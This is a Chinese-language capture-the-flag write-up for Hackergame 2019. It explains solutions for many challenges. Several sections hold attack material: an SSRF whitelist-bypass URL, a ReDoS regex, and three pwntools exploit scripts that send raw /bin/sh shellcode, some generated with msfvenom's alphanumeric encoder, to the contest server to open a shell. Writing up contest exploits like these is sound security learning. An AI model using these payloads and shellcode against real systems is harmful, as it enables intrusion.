# Hackergame2019部分Write Up

### 0x01 签到题

复制token+修改button标签属性去掉disabled

```html
<button data-v-52fd0931="" disabled="disabled">点击此处，获取 flag</button>
```

这个故事告诉我们开发只做前端验证是万万不行的

### 0x02 白与夜

直接放StegSolve里flag就出来了。。。。。。。

### 0x03 信息安全2077

一开始想直接修改系统时间的，结果发现好像改不到2077。。。。。

Chrome F12打开Dev-Tool,在Source标签页下的(index)中

```js
  var now = new Date().toUTCString()
```
的下一行设置断点

运行到断点处时在Console中修改now的值

```js
now = new Date(2077,10,15).toUTCString()
```

### 0x04 宇宙终极问题

银河系漫游指南梗。。。。。。。

#### T1

百度一下。。。。。。。

### 0x04 网页读取器

源代码核心部分

```python
def check_hostname(url):
    for i in whitelist_scheme:
        if url.startswith(i):
            url = url[len(i):]  # strip scheme
            url = url[url.find("@") + 1:]  # strip userinfo
            if not url.find("/") == -1:
                url = url[:url.find("/")]  # strip parts after authority
            if not url.find(":") == -1:
                url = url[:url.find(":")]  # strip port
            if url not in whitelist_hostname:
                return (False, "hostname {} not in whitelist".format(url))
            return (True, "ok")
    return (False, "scheme not in whitelist, only {} allowed".format(whitelist_scheme))
```

最后检验的url是在第一个'@'之后和第一个':'之前的

一开始翻了好久的SSRF

全都卡在@上面了。。。。。。

后来发现‘#’这个东西是页面定位的再加上‘@’后就直接可以检测的url就可以切到后面了绕过了

payload="http://web1/flag#@example.com:80"

### 0x05 达拉崩吧大冒险

把玩了一下发现要让Attack变大

一开始仿照信息安全2077那题想直接在本地修改Money和Attack

但是看了一眼源码

```js
    $("#send").click(
        function () {
            let v = $("#input option:selected").val();
            addMsg("我", opts[parseInt(v)]);
            ws.send(v)
        }
    );
```

每次只能上传一个“v”，数值的计算是在服务端完成的。。。。。

因为前面的v都是对话选项，尝试输入其他数都不行，卡了好久

甚至去想了怎么websocket溢出攻击。。。。。。。。

后来发现买鸡的选项没有限制

可以搞负数

然后根据整数的储存原理

注入

```js
v="-3089348814741910323"
```

得到

```
Money:
6178697629483821000
Attack:
3000000000000000000
```

然后挑战恶龙就完了

### 0x06 Happy Lug

因为一直在想域名和ip的事情

把域名本地解析到hack.lug.ustc.edu.cn的ip

然而没有什么卵用。。。。。

后来查了一下发现是绑定了TXT记录的子域名。。。。。。

```bash
nslookup -qt=txt xn--g28h.hack.ustclug.org
```

（作为一个管理过域名的人没有想到这个知识点真的是太差劲了。。。。）

### 0x07 正则验证器

考察正则的回溯问题

在进行匹配的时候，匹配引擎在前面的a字符的时候，匹配成功，到达b的时候，匹配失败，就会进行回溯，而回溯的数量，和之前匹配的数量呈指数的增长趋势。

Payload

```
RegEx:(a+)*s
Strings:aaaaaaaaaaaaaaaaaaaaaaab
```

### 0x08 不同寻常的Python 考试

感谢这个题目让我知道了Python是有多么的“漏洞百出”

```python
payload1="\"Hello\"" 

payload2="1,1,1.0,1" #is 要求对象一致 这里是类型相同

payload3="\"True\"" #字符串好像可以强转list和bool量？

payload4="[1],1" #列表和数字乘法的不同

payload5="[3,2,1]" #list(a)+[x] => [x]

payload6="{1,2,3},{4}" #Python set比较的奇怪方式。。。。

payload7="3,[3,1],[2,3]" #列表乘法的顺序

payload8="[3,2,1],-6,-2" #列表乘上负数就变空了

payload9="-1,6" #显然-1的6次方是个整数而6的负一次方是个浮点数

payload10="\"x2\",\"\"" #""似乎也能匹配字符串末尾的字符
```

写不动了弃坑。。。。。。。

### 0x09 小巧玲珑的ELF

file 一下发现是64位的ELF 拖到IDA pro里

```cpp
void __noreturn start()
{
  v0 = 102;
  v1 = 110;
  v2 = 101;
  v3 = 107;
  v4 = -125;
  v5 = 78;
  v6 = 109;
  v7 = 116;
  v8 = -123;
  v9 = 122;
  v10 = 111;
  v11 = 87;
  v12 = -111;
  v13 = 115;
  v14 = -112;
  v15 = 79;
  v16 = -115;
  v17 = 127;
  v18 = 99;
  v19 = 54;
  v20 = 108;
  v21 = 110;
  v22 = -121;
  v23 = 105;
  v24 = -93;
  v25 = 111;
  v26 = 88;
  v27 = 115;
  v28 = 102;
  v29 = 86;
  v30 = -109;
  v31 = -97;
  v32 = 105;
  v33 = 112;
  v34 = 56;
  v35 = 118;
  v36 = 113;
  v37 = 120;
  v38 = 111;
  v39 = 99;
  v40 = -60;
  v41 = -126;
  v42 = -124;
  v43 = -66;
  v44 = -69;
  v45 = -51;
  __asm
  {
    syscall; LINUX - sys_write
    syscall; LINUX - sys_read
  }
  for ( i = 0; i <= 45; ++i )
  {
    buf[i] += 2 * i;
    buf[i] ^= i;
    buf[i] -= i;
  }
  for ( j = 0; j <= 45; ++j )
  {
    if ( buf[j] != *(&v0 + j) )
      __asm { syscall; LINUX - sys_exit }
  }
  __asm
  {
    syscall; LINUX - sys_write
    syscall; LINUX - sys_exit
  }
}
```

然后异或反向搞一下就行了

```cpp
  for ( i = 0; i <= 45; ++i )
  {
    v[i] += i;
    v[i] ^= i;
    v[i] -= 2 * i;
  }
```

### 0x0A Shell骇客

一开始没有搞明白这行代码是拿来干嘛的

```cpp
((void(*)(void))buf)();
```

后来问了学长才知道相当于call $xxx ,xxx是buf里面的东西

也就是说我们要在这里放shellcode

#### T1

先file 一下看看平台

```bash
file chall1
chall1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cdd2ffe971d1f476aa908aaa680dc36973d9115, not stripped
```

然后到http://shell-storm.org/shellcode/上整一个相应的shellcode

用pwntool写一个Exploit

```python
#coding=utf-8
from pwn import *
context(arch = 'amd64', os = 'linux')

token="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
dist=remote("202.38.93.241","10000")
#dist=process("./chall1")
shellcode="\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
dist.recvuntil("Please input your token: ")
dist.sendline(token)
dist.send(shellcode)
dist.interactive()
```

#### T2

增加了字符过滤，只允许A-Z和0-9

怎么办呢？

发现是32位的ELF

```bash
file chall2
chall2: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2ae2aca37c13b197362f8f8709c158d20be5a983, for GNU/Linux 3.2.0, not stripped
```

搜索引擎找了一下发现

可以用msfvenom借助 x86/alpha_upper 的Encoder生成一个只有大写字母和数字的shellcode

> 注意要手动指定BufferRegister=ECX 否则生成的shellcode头部会带一下用于定位的无法用ASCii编写的shellcode

```bash
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_upper BufferRegister=ECX -f python x86/alpha_upper
```

类似地用pwntool写一个Exploit

```python
#coding=utf-8
from pwn import *
context(arch = 'i386', os = 'linux')

token="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
dist=remote("202.38.93.241","10002")
#dist=process("./chall2")
buf =  b""
buf += b"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a"
buf += b"\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33"
buf += b"\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
buf += b"\x38\x41\x43\x4a\x4a\x49\x42\x4a\x44\x4b\x36\x38\x4a"
buf += b"\x39\x46\x32\x45\x36\x43\x58\x36\x4d\x43\x53\x4c\x49"
buf += b"\x4d\x37\x55\x38\x56\x4f\x34\x33\x35\x38\x43\x30\x42"
buf += b"\x48\x46\x4f\x53\x52\x53\x59\x32\x4e\x4d\x59\x4b\x53"
buf += b"\x31\x42\x5a\x48\x43\x33\x55\x50\x35\x50\x43\x30\x54"
buf += b"\x33\x35\x38\x55\x50\x46\x37\x31\x43\x4b\x39\x4d\x31"
buf += b"\x58\x4d\x4d\x50\x41\x41"
dist.recvuntil("Please input your token: ")
dist.sendline(token)
dist.send(buf)
dist.interactive()
```

### T3 

一看过滤的字符更少了呀，应该直接复制一下就行了？

但是file发现是64位的，而msfvenom中并没有对应的编码器

然后又是漫长地搜索资料时间

最后发现可以用

Github上的 shellcode_encoder来Encode

于是由从http://shell-storm.org/shellcode/整了一个相应的shellcode 写到shell.bin里 然后找到对应的地址rax+29

```cpp
python2 main.py shellcode rax+29
```

> 因为其中奇奇怪怪的转义符号，最后还是手写了个脚本把字符串转成了对应的hex。。。。。。

```python
#coding=utf-8
from pwn import *
context(arch = 'amd64', os = 'linux')

token="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
dist=remote("202.38.93.241","10004")
#dist=process("./chall3")
shellcode="\x50\x50\x54\x41\x59\x41\x58\x56\x49\x33\x31\x56\x58\x58\x58\x66\x2d\x24\x3f\x66\x2d\x7a\x78\x66\x2d\x45\x48\x50\x5a\x54\x41\x59\x41\x58\x56\x49\x33\x31\x56\x58\x50\x50\x5b\x5f\x48\x63\x34\x3a\x31\x34\x3a\x53\x58\x2d\x62\x2b\x65\x32\x2d\x28\x20\x5f\x60\x35\x3e\x3f\x3f\x5f\x50\x5e\x31\x34\x3a\x57\x58\x2d\x3f\x3f\x3f\x3f\x2d\x7d\x60\x61\x43\x2d\x40\x60\x5f\x7d\x50\x5f\x48\x63\x34\x3a\x31\x34\x3a\x53\x58\x2d\x49\x4f\x46\x60\x2d\x41\x60\x21\x20\x35\x3e\x5f\x37\x3b\x50\x5e\x31\x34\x3a\x57\x58\x2d\x3f\x3f\x3f\x3f\x2d\x7d\x60\x61\x43\x2d\x40\x60\x5f\x7d\x50\x5f\x48\x63\x34\x3a\x31\x34\x3a\x53\x58\x2d\x3c\x68\x68\x29\x2d\x68\x60\x20\x20\x35\x6e\x3f\x3f\x3f\x50\x5e\x31\x34\x3a\x57\x58\x2d\x3f\x3f\x3f\x3f\x2d\x7d\x60\x61\x43\x2d\x40\x60\x5f\x7d\x50\x5f\x48\x63\x34\x3a\x31\x34\x3a\x53\x58\x2d\x40\x7b\x23\x27\x2d\x75\x78\x20\x40\x35\x4f\x36\x3f\x5f\x50\x5e\x31\x34\x3a\x57\x58\x2d\x3f\x3f\x3f\x3f\x2d\x7d\x60\x61\x43\x2d\x40\x60\x5f\x7d\x50\x5f\x48\x63\x34\x3a\x31\x34\x3a\x53\x58\x2d\x40\x23\x36\x70\x2d\x42\x20\x30\x60\x35\x76\x3f\x5f\x3f\x50\x5e\x31\x34\x3a\x57\x58\x2d\x3f\x3f\x3f\x3f\x2d\x7d\x60\x61\x43\x2d\x40\x60\x5f\x7d\x50\x5f\x48\x63\x34\x3a\x31\x34\x3a\x53\x58\x2d\x32\x20\x75\x40\x2d\x26\x40\x40\x20\x35\x2d\x5f\x3f\x77\x50\x5e\x31\x34\x3a\x57\x58\x2d\x3f\x3f\x3f\x3f\x2d\x7d\x60\x61\x43\x2d\x40\x60\x5f\x7d\x50\x5f\x53\x58\x2d\x20\x58\x22\x50\x2d\x20\x40\x7e\x70\x35\x58\x66\x5f\x3f\x50\x5f\x48\x63\x34\x3a\x31\x34\x3a\x53\x58\x2d\x20\x38\x30\x31\x2d\x20\x40\x20\x20\x35\x3f\x65\x3f\x3e\x50\x5e\x31\x34\x3a\x57\x58\x2d\x3f\x3f\x3f\x3f\x2d\x7d\x60\x61\x43\x2d\x40\x60\x5f\x7d\x50\x5f\x53\x58\x2d\x20\x60\x23\x51\x2d\x40\x60\x7d\x3f\x35\x3c\x3e\x5f\x6f\x50\x5e\x53\x58\x2d\x79\x60\x62\x42\x2d\x49\x40\x3e\x7e\x35\x26\x5f\x5f\x3f\x50\x5f\x41\x41\x41\x41\x7a\x5f\x48\x4c\x63\x20\x43\x6e\x59\x69\x3f\x6f\x4a\x6b\x61\x2a\x5d\x57\x3a\x2f\x58\x32\x34\x6a\x7d\x7e\x4f\x23\x48\x29\x21\x35\x45\x5a\x31\x70\x67\x7d\x3e\x56\x75\x6e\x5d\x3b\x3c\x64\x4f\x70\x23\x78\x6c\x26\x4f\x64\x42\x28\x63\x5b\x64\x30\x5e\x3f\x2d\x41\x47\x4b\x5d\x3f\x66\x39\x31\x41\x75\x77\x29\x6c\x63\x61\x2a\x47\x41\x5e\x59\x31\x78\x68\x37\x25\x4f\x2f\x2e\x7e\x37\x28\x39\x2d"
dist.recvuntil("Please input your token: ")
dist.sendline(token)
dist.send(shellcode)
dist.interactive()
```

### 0x0B 三教奇妙夜

看了一下发现有很多相同帧

着手尝试能不能用ffmpeg把其中的相同帧分离开来

```bash
ffmpeg.exe -i output.mp4 -vf mpdecimate,setpts=N/FRAME_RATE/TB outfile.avi #删除间隔重复帧
ffmpeg.exe -i outfile.avi out.%d.jpg#导出为帧序列
```

然后一张张拼起来就完了

#### 0x0C  驴啃计算器

一开始以为键盘上的都要用到

然后搜索了下发现只用三角函数嵌套是可以得到（逼近）任意有理数的

初始值为$$x=0$$

可以证明让$$x+1$$只需要$$sqrt,atan,cos,1/x,x^2$$

然后$$x \to 1/x$$只需要$$1/x$$

用连分数的方式迭代

倒过来搞就行了

> Tip1:可以直接将有限小数换成分数避免精度问题
>
> Tip2:要开long long 防止溢出负数。。。。。。。
>
> Tip3:用Python写会不会方便一点？。。。。。

```cpp
#include<cstdio>
#include<cmath>
const double eps=0.00001;
char begin[]="sqrt,";
char end[]="x^2,";
char add1[]="atan,cos,1/x,";
char inv[]="1/x,";

long long fac; 
long long fav;

void solve(){
    int cnt=fac/fav;
    fac-=fav*cnt;
    if(fac){
    	long long t=fac;fac=fav,fav=t;
    	solve();
    	printf(inv);
	}
	printf(begin);
	while(cnt--) printf(add1);
	printf(end);
}
inline void read(){
	char c;
	fac=0;
	for(c=getchar();'0'<=c&&c<='9';c=getchar()) fac=fac*10+c-'0';
	fav=1;
	for(c=getchar();'0'<=c&&c<='9';c=getchar()) fac=fac*10+c-'0',fav*=10;
}
int main(){
	freopen("s.out","w",stdout);
	double x;
	read();
	solve();
	return 0;
}
```

### 0x0D 我想要个家

显然不能把/bin /home....删了呀

然后找了找有没有能让程序看不到根目录的方法

结果找到了虚拟一个根目录的方法

***chroot***

```bash
mkdir /opt/chroot
mkdir /opt/chroot/rbin
cp /bin/bash /opt/chroot/rbin/ #放置bash 到/rbin 避开限制
cp -r /lib /opt/chroot/   #复制依赖库
cp -r /lib64 /opt/chroot/ #复制依赖库
chroot /opt/chroot /rbin/bash #运行虚拟根目录环境
```

然后你就会得到一个根目录符号要求的shell

由于这个shell缺少很多功能。所以你可以事先在原环境中把条件都搞定

1. ```bash
   mkdir Bedroom  Kitchen  Lavatory  Living_Room #在“根目录”下依次创立Bedroom  Kitchen  Lavatory  Living_Room
   ```

2. ```bash
   cd Bedroom ln -s Headset  Microphone #创建文件软连接 使两个文本内容一致
   ```

3. 写一个往Clock写当前时间的脚本
```bash
#!/bin/bash
while(true)
do
LOG_TIME=`date +%H:%M:%S`
echo $LOG_TIME > Clock
#sleep 1
done
```
   再开一个终端“后台”运行这个脚本

4. 为shell添加sleep功能

   ```bash
   cp /bin/sleep /opt/chroot/rbin/ 
   touch ./dev/null #调用sleep /dev/null 报错于是建之
   ```

   然后运行一下题目给的脚本就完了

### 0x0E 没有BUG的教务系统

#### T1

听说是个可做题

于是下下来试着搞了一下

密码部分核心逻辑

```cpp
    count = read(0, temp_password, 0x9f);
    temp_password[count] = '\x00';
    memcpy(password, temp_password, count + 1);

    for (i = 0; i <= 7; ++i)
        temp_password[i] = ((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) | i) & ~((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) & i);
```

 关于 t[i] = (( t[i] |  t[i + 1]) & ~( t[i] &  t[i + 1]) | i) & ~(( t[i] |  t[i + 1]) & ~( t[i] &  t[i + 1]) & i);

利用德摩根反演率

$$\neg (a \and b)= \neg a \or \neg b$$

$$\neg(a \or b)= \neg a \and \neg b$$

然后发现

( t[i] |  t[i + 1]) & ~( t[i] &  t[i + 1]) 是个异或

得到  t[i] = ( t[i]^t[i+1] | i) & ~( t[i]^t[i+1] & i);

这个又是个异或

得到 t[i]=t[i]^t[i+1]^i

然后还原就是 t[i]=t[i]^i^t[i+1]

```cpp
#include<cstdio>
#include<cstring>
char str[]="\x44\x00\x02\x41\x43\x47\x10\x63\x00";
int main(){
	for(int i=7;i>=0;--i)
		str[i]=str[i]^i^str[i+1];
	for(int i=0;i<=7;++i)
		putchar(str[i]);
	return 0;
}
```

得到密码也即flag

### 0x0F 参考资料

shellcode:

[http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)

[https://www.anquanke.com/post/id/85871](https://www.anquanke.com/post/id/85871)

[http://blog.eonew.cn/archives/1125#x64](http://blog.eonew.cn/archives/1125#x64)

[http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html](http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html)

如何用三角函数得出任意一个正有理数:

[http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html](http://blog.sina.com.cn/s/blog_a661ecd501012xsr.html)
